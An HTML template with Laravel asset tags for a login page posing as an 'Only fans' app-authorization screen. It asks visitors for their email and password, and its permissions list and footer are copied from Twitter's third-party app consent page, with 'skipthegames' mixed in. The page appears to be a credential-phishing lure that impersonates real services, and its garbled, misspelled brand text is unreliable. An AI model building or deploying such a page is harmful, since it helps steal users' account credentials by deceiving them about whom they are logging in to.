<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="{{asset('frontend/assets/css/glogin.css')}}" />
  </head>
  <body>
    <header>
      <div class="container-fluid">
        <div class="full-nav">
          <div class="row">
            <div class="col-md-12">
              <div class="nav-inner">
                <div class="brand-logo">
                  <img src="{{asset('frontend/assets/images/page2-logo.png')}}" alt="" />
                </div>
                <div class="ancore">
                  <a href="">Sign in for only fans></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <div class="container-fluid">
      <div class="box">
        <div class="mini-box">
          <div class="first-look">
            <div class="heading">
              <h4>Authorize only fans to access your accounts</h4>
            </div>
            <div class="submit-option">
              <form action="" method="POST">
                <input type="email" name="email" placeholder="Email" required /><br />
                <input type="password" name="password" placeholder="Password" required /><br />
                <button type="submit" name="submit">
                Log in
                </button>
              </form>
            </div>
          </div>
          <div class="side-logo">
            <div class="2nd-logo">
              <img src="image/Capture12.PNG" alt="" />
            </div>
          </div>
          <div class="text">
            <h5>Only fans</h5>
            <p>By only fans</p>
            <p>onlyfans.com/</p>
            <a href="1">Privacy Policy</a>
            <br />
            <a href="2">Terms and Conditions</a>
          </div>
        </div>
        <div class="service">
          <h6>This Application will be able to</h6>
        </div>
        <div class="unorder-list">
          <ul>
            <li>
              See your skipthegame profile information and accoutn seetings.See
              accounts you follow,mute and block.
            </li>
            <li>Follow and unfollow accounts for you.</li>
            <li>Update your profile and account settings.</li>
            <li>
              Post and delete Tweets for you, and engage with Text posted by
              others (like,un-like,or reply to a text,Retweet,etc.)for you.
            </li>
            <li>Create,manage,and delete Lists and collections for you.</li>
            <li>Mute,blockand report accounts for you.</li>
            <li>See your email address</li>
          </ul>
          <p class="simple-text">
            Learn more about third-party app permissions in the
            <a href="">Help Center</a>
          </p>
        </div>
      </div>
    </div>
    <footer>
      <div class="container-fluid">
        <div class="footer-text">
          <p class="big-text">
            We recommend reviewing the app's terms and privacy policy to
            understand how it willuse data from your Twitter account.You can
            revoke access to any app at any time from the
            <span>Apps and sessions</span> section of your skipthegames account
            Settings.
          </p>
        </div>
      </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
